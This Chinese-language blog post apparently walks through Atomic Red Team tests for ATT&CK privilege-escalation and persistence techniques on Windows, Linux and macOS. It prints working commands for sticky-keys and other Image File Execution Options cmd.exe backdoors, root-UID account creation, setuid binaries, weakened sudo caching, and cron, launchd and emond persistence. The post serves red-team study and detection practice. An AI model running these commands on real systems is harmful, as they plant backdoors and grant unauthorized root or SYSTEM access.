---
layout: post
title: 跟着ATT&CK学安全之privilege-escalation
excerpt: "跟着ATT&CK学安全之privilege-escalation"
categories: [ATT&CK]
comments: true
---
### T1050 - New Service
当操作系统启动的时候,他们可以通过服务来运行程序或应用.服务的配置信息存储在注册表中.

红队可以通过修改注册表或者使用工具集来修改配置进行服务安装.服务可以由administrator创建但是运行后拥有system权限.红队也可以使用Service Execution来直接运行服务
###### 测试1,创建一个新的服务
```
sc.exe create #{service_name} binPath= #{binary_path}
sc.exe start #{service_name}
```
就是
```
sc.exe create mortytest binPath= E:\pythonProject\atomic-red-team\atomics\T1050\bin\AtomicService.exe
sc.exe start mortytest
```
运行后进程中仍可以看到AtomicService.exe

清除痕迹
```
sc.exe stop mortytest
sc.exe delete mortytest
```
win10成功复现
###### 测试2 Service Installation PowerShell Installs A Local Service using PowerShell
安装服务
```
New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
Start-Service -Name "#{service_name}"
```
也就是
```
New-Service -Name "mortytest" -BinaryPathName "E:\pythonProject\atomic-red-team\atomics\T1050\bin\AtomicService.exe"
Start-Service -Name "mortytest"
```
运行后进程中仍可以看到AtomicService.exe

清除
```
Stop-Service -Name "mortytest"
(Get-WmiObject Win32_Service -filter "name='mortytest'").Delete()
```
win10成功复现
### T1015 - Accessibility Features
windows包含了一些不可见的特性,当使用登陆后使用组合键可以触发他们.红队可以修改启动他们的方式,从而在没有登陆系统的情况下获取命令行.

两个常见的程序是`C:\Windows\System32\sethc.exe`和`C:\Windows\System32\sethc.exe`,连续使用shift五次和`Windows + U `打开设置

其他的快捷键如下
- On-Screen Keyboard: C:\Windows\System32\osk.exe
- Magnifier: C:\Windows\System32\Magnify.exe
- Narrator: C:\Windows\System32\Narrator.exe
- Display Switcher: C:\Windows\System32\DisplaySwitch.exe
- App Switcher: C:\Windows\System32\AtBroker.exe
###### 测试1 Attaches Command Prompt As Debugger To Process - osk
这个就是调用出软键盘,和运行`osk.exe`一个效果
```
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe"
$Value = "C:\windows\system32\cmd.exe"
$Name = "Debugger"
New-Item -Path $registryPath -Force
New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
```
检测就是监控那个svchost进程的process create操作

win10上成功复现
###### 测试2 Attaches Command Prompt As Debugger To Process - sethc
这个就是粘滞键(连续按5次shift)
```
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
$Value = "C:\windows\system32\cmd.exe"
$Name = "Debugger"
New-Item -Path $registryPath -Force
New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
```
检测就是监控那个svchost进程的process create操作

win10上成功复现
###### 测试3 Attaches Command Prompt As Debugger To Process - utilman
这个就是设置那个界面,和运行`utilman.exe`一样
```
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
$Value = "C:\windows\system32\cmd.exe"
$Name = "Debugger"
New-Item -Path $registryPath -Force
New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
```
检测就是监控那个svchost进程的process create操作

删除
```
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /f
```
win10上成功复现
###### 测试4 Attaches Command Prompt As Debugger To Process - magnify
这个就是放大镜,和运行`magnify.exe`一样
```
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe"
$Value = "C:\windows\system32\cmd.exe"
$Name = "Debugger"
New-Item -Path $registryPath -Force
New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
```
删除
```
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /f
```
检测就是监控那个svchost进程的process create操作

win10上成功复现
###### 测试6 Attaches Command Prompt As Debugger To Process - DisplaySwitch
投影
```
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe"
$Value = "C:\windows\system32\cmd.exe"
$Name = "Debugger"
New-Item -Path $registryPath -Force
New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
```
检测就是监控那个svchost进程的process create操作

win10上成功复现
###### 测试7 Attaches Command Prompt As Debugger To Process - AtBroker
```
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe"
$Value = "C:\windows\system32\calc.exe"
$Name = "Debugger"
New-Item -Path $registryPath -Force | Out-Null
New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
```
检测就是监控那个svchost进程的process create操作

win10上成功复现
### T1103 - AppInit DLLs
AppInit_Dlls键值位于注册表 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows or HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows`下面，相对于其他的注册表启动项来说，这个键值的特殊之处在于任何使用到User32.dll 的EXE、DLL、OCX等类型的PE文件都会读取这个地方，并且根据约定的规范将这个键值下指向的DLL文件进行加载，加载的方式是调用 LoadLibrary。红队可以使用它加载恶意的dll从而实现persistence和privilege escalation

**AppInit DLL方法在win8和之后的版本已经不能使用了(当secure boot开启的时候)**
###### 测试1 Install AppInit Shim
```
reg.exe import T1103.reg
```
检测的话,查看注册表就行

win10上成功复现
### T1138 - Application Shimming
The Microsoft Windows Application Compatibility Infrastructure/Framework(应用兼容基础框架)是用来做操作系统代码向下兼容的,例如它允许开发者修改为windowsxp创建的应用程序以便它在win10上继续使用.shims在操作系统和应用之间充当一个缓冲的角色,当程序运行的时候,shims 缓存决定程序是否需要shim database (.sdb),如果需要,shim将使用Hooking技术(https://attack.mitre.org/techniques/T1179)重定向代码以便与操作系统的通信,shims的默认安装位置如下
- `%WINDIR%\AppPatch\sysmain.sdb`
- `hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb`
databases存储的位置如下
- `%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom`
- `hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom`

为了保证shims安全,shims运行在用户模式下,并且你需要使用adminstrator权限来运行它.shims可以用来bypass UAC,向进程中注入dll.禁止 Data Execution Prevention和Structure Exception Handling和获取内存数据.向Hooking一样,利用shims可以让红队权限提升,安装后门,关闭windows防护功能等等.
###### 测试1 Application Shim Installation
```
sdbinst.exe D:\pycharmproject\atomic-red-team-master\atomics\T1138\src\AtomicShimx86.sdb
sdbinst.exe -u D:\pycharmproject\atomic-red-team-master\atomics\T1138\src\AtomicShimx86.sdb
```
有效果,但是不知道是干啥的
### T1136 - Create Account
红队可以创建一个账号来维持控制,windows上用`net user`来创建账号
###### 测试1 Create a user account on a Linux system
平台:linux
```
useradd -M -N -r -s /bin/bash -c evil_account eviluser
```
成功复现
###### 测试2 Create a new user in a command prompt
平台:windows
```
net user /add morty test123456
```
win10成功复现
###### 测试3 Create a new user in PowerShell
powershell中运行
```
New-LocalUser -Name morty -NoPassword
```
win10成功复现
###### 测试4 Create a new user in Linux with root UID and GID.
linux中运行
```
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
echo "#{password}" | passwd --stdin #{username}
```
成功复现
### T1042 - Change Default File Association
```bash
cmd.exe /c assoc .wav="C:\Program Files\Windows Media Player\wmplayer.exe"
或者
cmd.exe /c assoc .aa="C:\Program Files\Windows Media Player\wmplayer.exe"
```
看到成功修改了,但是不知道怎么用
### T1128 - Netsh Helper DLL
Netsh.exe(也叫做Netshell)就用来配置网络的命令行集合,它允许添加helper dlls用来新增函数,它的位置在`HKLM\SOFTWARE\Microsoft\Netsh`

红队可以使用它来加载一些恶意的dll,当系统运行了netsh的时候,恶意的dll就会运行

netsh常用命令如下
```
查看ip配置信息： netsh interface ip show config

查看网络配置文件： netsh -c interface dump

开/关网卡： netsh int set int name="ethernet" admin=enabled netsh int set int name="ethernet" admin=disabled

查看所有tcp连接： netsh interface ip show tcpconnections

设置本机ip、子网掩码、网关ip： netsh interface ip set address "Local Area Connection" static 192.168.1.2 255.255.255.0 192.168.1.1

查看防火墙状态： netsh firewall show state

开/关防火墙：

netsh firewall set opmode enable

netsh firewall set opmode disable
```
关于netsh persistence的项目地址`https://github.com/outflanknl/NetshHelperBeacon`
添加helper dll
```bash
netsh add helper c:\test\netshtest.dll
```
在注册表`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh`中便添加上去了dll,helper dll添加成功后，每次调用netsh，均会加载c:\test\netshtest.dll

检测: 查看注册表如下位置`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh`

win10成功复现
### T1100 - Web Shell
这个就是在有web服务的基础上添加一个webshell,不再演示

win10成功复现
### T1023 - Shortcut Modification
红队可以使用快捷方式运行他们的程序来persistence,他们可以使用[Masquerading](https://attack.mitre.org/techniques/T1036)来使它看起来像一个正常的程序,攻击者也可以修改快捷方式的路径,从而运行到其他程序
###### 测试1 Shortcut Modification
这个没有成功复现
### T1180 - Screensaver
`.scr`是屏幕保护程序的后缀名,屏幕保护程序`scrnsave.scr`的位置在`C:\Windows\System32\`和`C:\Windows\sysWOW64`,屏幕保护的注册表设置在`HKCU\Control Panel\Desktop`,他们可以以如下途径进行persistence

- SCRNSAVE.exe - set to malicious PE path
- ScreenSaveActive - set to '1' to enable the screensaver
- ScreenSaverIsSecure - set to '0' to not require a password to unlock
- ScreenSaveTimeout - sets user inactivity timeout before screensaver is executed

红队可以使用屏幕保护程序persistence恶意程序(当用户一段时间没有对电脑操作,触发了屏幕保护程序)
###### 测试1 Set Arbitrary Binary as Screensaver
```
copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
shutdown /r /t 0
```
**没有成功复现**





### T1166 - Setuid and Setgid
对于setuid与setgid:文件权限的机制是Linux系统中的一大特色，除了我们现在所熟知的读（r）、写（w）、执行（x）权限外，还有三个比较特殊的权限，分别为：setuid、setgid和stick bit（粘滞位）:setuid的作用是“让执行该命令的用户以该命令拥有者的权限去执行”，setgid的意思和它是一样的，即让执行文件的用户以该文件所属组的权限去执行。

红队可以使用这个技术来使恶意程序以root权限运行.
###### 测试1 Make and modify binary from C source
```
copy #{payload} /tmp/hello.c
cd /tmp
sudo chown root hello.c
sudo make hello
sudo chown root hello
sudo chmod u+s hello
./hello
```
成功复现
###### 测试2 Set a SetUID flag on file
```
sudo touch #{file_to_setuid}
sudo chown root #{file_to_setuid}
sudo chmod u+s #{file_to_setuid}
```
成功复现
###### 测试3  Set a SetGID flag on file
```
sudo touch #{file_to_setuid}
sudo chown root #{file_to_setuid}
sudo chmod g+s #{file_to_setuid}
```
成功复现
### T1169 - Sudo
`/etc/sudoers`文件保存着哪些用户可以进行权限提升
###### 测试1 Sudo usage
```
sudo -l
sudo su
cat /etc/sudoers
vim /etc/sudoers
```
成功复现
### T1206 - Sudo Caching
`sudo`命令允许当前用户以root权限进行操作.sudo也有一些有用的配置例如`timestamp_timeout`代表使用sudo命令密码的有效期.这是因为sudo有缓存权限的能力.sudo在`/var/db/sudo`文件中设置`timestamp_timeout`,另外,还有一个`tty_tickets`将每个terminal session设置为独立的.这意味着一个终端的超时时间不会影响另外一个

通过查看`/var/db/sudo`的时间戳来决定是否需要重复使用密码,而如果tty_tickets设置为不可用,那么任何新的终端使用sudo都不用输入密码了
###### 测试1 Unlimited sudo cache timeout
```
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers
```
应该可以
###### 测试2 Disable tty_tickets for sudo caching
```
sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
sudo visudo -c -f /etc/sudoers
```
应该可以
### T1504 - PowerShell Profile
红队可以通过修改powershell中的配置文件,进行权限persistence
###### 测试1 Append malicious start-process cmdlet
```
New-Item -Path $profile -Type File -Force
$malicious = "Start-Process calc.exe"
Add-Content $profile -Value $malicious
powershell -command exit
```
清除命令
```
$oldprofile = cat $profile | Select-Object -skiplast 1
Set-Content $profile -Value $oldprofile
```
win10成功复现
### T1058 - Service Registry Permissions Weakness
windows服务配置的位置在注册表`HKLM\SYSTEM\CurrentControlSet\Services`中,可以修改其中的键值来改变服务运行的参数.红队也可以修改服务失败后相关的键,那么服务一旦出错,就会运行我们修改的键
###### 测试1 Service Registry Permissions Weakness
```
get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL
例如
get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\weakservicename |FL
```
没有成功复现

## macos

## T1546.004 - .bash_profile and .bashrc

红队可以在`~/.bash_profile` 和 `~/.bashrc`中创建命令，并通过用户调起shell来运行红队存储的恶意指令。

`/.bash_profile`在用户登陆后运行，`/.bashrc`运行在shell启动时，Demo如下

**Demo 1 Add command to .bash_profile**

```
echo "#{command_to_add}" >> ~/.bash_profile
```

**Demo2  Add command to .bashrc**

```
echo "#{command_to_add}" >> ~/.bashrc
```

### T1053.003 - Cron

红队可以利用cron来进行任务调度，执行恶意代码。cron是类Unix系统基于时间的调度工具集。crontab文件包含了任务调度的实体。红队通常使用cron来进行持久化、程序执行或者是横向移动。

**Demo1 替换cron指向的文件**

这个demo替换了用户的crontab文件，这项技术应用在多个IOT自动化攻击中

```
crontab -l > /tmp/notevil
echo "* * * * * /tmp/evil.sh" > /tmp/persistevil && crontab /tmp/persistevil
```

**Demo2 在cron的文件夹中添加任务**

这个demo在cron文件夹中配置调度任务，demo如下

```
echo "echo 'Hello from Atomic Red Team' > /tmp/atomic.log" > /etc/cron.daily/#persistevil
```

## T1546.014 - Emond

红队可以通过修改Event Monitor Daemon (emond)的规则，等待用户触发，来实现持久化和提权.Emond是一个守护进程，接收各个服务发来的events，并通过简单的规则来进行进一步操作。这个文件`/sbin/emond`加载的规则目录在这里：`/etc/emond.d/rules/`

Demo如下

```
sudo cp T1546.014_emond.plist /etc/emond.d/rules/T1546.014_emond.plist
sudo touch /private/var/db/emondClients/T1546.014
```

其中T1546.014_emond.plist内容如下

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<array>
	<dict>
		<key>name</key>
		<string>AtomicRedTeam_T1546_014</string>
        <key>enabled</key>
        <true/>
        <key>eventTypes</key>
        <array>
            <string>startup</string>
        </array>
        <key>actions</key>
        <array>
            <dict>
                <key>command</key>
                <string>/usr/bin/sleep</string>
                <key>user</key>
                <string>root</string>
                <key>arguments</key>
                    <array>
                        <string>10</string>
                    </array>
                <key>type</key>
                <string>RunCommand</string>
            </dict>
            <dict>
                <key>command</key>
                <string>/usr/bin/touch</string>
                <key>user</key>
                <string>root</string>
                <key>arguments</key>
                    <array>
                        <string>/tmp/T1546_014_atomicredteam</string>
                    </array>
                <key>type</key>
                <string>RunCommand</string>
            </dict>
        </array>
    </dict>
</array>
</plist>
```

## T1543.001 - Launch Agent

红队可以通过创建或修改launch agents来实现持久化，每当有用户登陆，系统会运行/System/Library/LaunchAgents`, `/Library/LaunchAgents`, 和$HOME/Library/LaunchAgents这里的plist，Demo如下

```
if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
sudo cp atomicredteam_T1543_001.plist ~/Library/LaunchAgents/com.atomicredteam.plist
sudo launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist
```

其中atomicredteam_T1543_001.plist

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.atomicredteam.t1543_001</string>
  <key>ProgramArguments</key>
  <array>
  <string>touch</string>
  <string>/tmp/T1543_001_atomicredteam.txt</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>NSUIElement</key>
  <string>1</string>
</dict>
</plist>
```

## T1543.004 - Launch Daemon

红队可以创建或者修改一个launch daemons来重复运行恶意的payload来进行持久化。当macOS系统启动的时候，launchd会启动来完成初始化。这个进程从plist文件中加载每一个守护进程。

```
if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
sudo cp atomicredteam_T1543_001.plist ~/Library/LaunchAgents/com.atomicredteam.plist
sudo launchctl load -w ~/Library/LaunchAgents/com.atomicredteam.plist
```

其中atomicredteam_T1543_001.plist

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.atomicredteam.t1543_001</string>
  <key>ProgramArguments</key>
  <array>
  <string>touch</string>
  <string>/tmp/T1543_001_atomicredteam.txt</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>NSUIElement</key>
  <string>1</string>
</dict>
</plist>
```

## T1053.004 - Launchd

红队可以使用Launchd来调度或者运行恶意代码.其中launchd守护进程的作用就是加载和维持系统的服务，该进程加载的plist参数分别来自`/System/Library/LaunchDaemons` 和 `/Library/LaunchDaemons` 

红队可以使用macos中的launchd来调度启动文件夹下的可执行文件用来进行持久化，launchd也可以指定特定的用户运行程序

**Demo1 创建事件监听守护进程（Event Monitor Daemon）来持久化**

这个Demo通过修改plist来实现持久化

```
sudo cp a.plist /etc/emond.d/rules/atomicredteam_T1053_004.plist
sudo touch /private/var/db/emondClients/randon  #Random name of the empty file used to trigger emond service
```

其中a.plist内容如下

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<array>
    <dict>
        <key>name</key>
        <string>com.atomicredteam.t1053_004</string>
        <key>enabled</key>
        <true/>
        <key>eventTypes</key>
        <array>
            <string>startup</string>
        </array>
        <key>actions</key>
        <array>
            <dict>
                <key>command</key>
                <string>/usr/bin/sleep</string>
                <key>user</key>
                <string>root</string>
                <key>arguments</key>
                    <array>
                        <string>10</string>
                    </array>
                <key>type</key>
                <string>RunCommand</string>
            </dict>
            <dict>
                <key>command</key>
                <string>/usr/bin/touch</string>
                <key>user</key>
                <string>root</string>
                <key>arguments</key>
                    <array>
                        <string>/tmp/T1053_004_atomicredteam</string>
                    </array>
                <key>type</key>
                <string>RunCommand</string>
            </dict>
        </array>
    </dict>
</array>
</plist>
```

## T1037.004 - Rc.common

macOS在启动的过程中会执行`source /etc/rc.common`，红队可以根据这个特性，使用rc.common进行持久化，Demo如下

```
sudo echo osascript -e 'tell app "Finder" to display dialog "Hello World"' >> /etc/rc.common
```

## T1547.007 - Re-opened Applications

简而言之就是修改`~/Library/Preferences/com.apple.loginwindow.plist` 和 `~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist`中指向的文件来实现持久化，

Demo如下

```
sudo defaults write com.apple.loginwindow LoginHook #{script}
```

## T1548.003 - Sudo and Sudo Caching

`sudo`命令允许当前用户以root权限进行操作.sudo也有一些有用的配置例如`timestamp_timeout`代表使用sudo命令密码的有效期.这是因为sudo有缓存权限的能力.sudo在`/var/db/sudo`文件中设置`timestamp_timeout`,另外,还有一个`tty_tickets`将每个terminal session设置为独立的.这意味着一个终端的超时时间不会影响另外一个

通过查看`/var/db/sudo`的时间戳来决定是否需要重复使用密码,而如果tty_tickets设置为不可用,那么任何新的终端使用sudo都不用输入密码了，Demo如下

###### 

###### Demo1 Unlimited sudo cache timeout

```
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers
```

###### Demo2 Disable tty_tickets for sudo caching

```
sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
sudo visudo -c -f /etc/sudoers
```

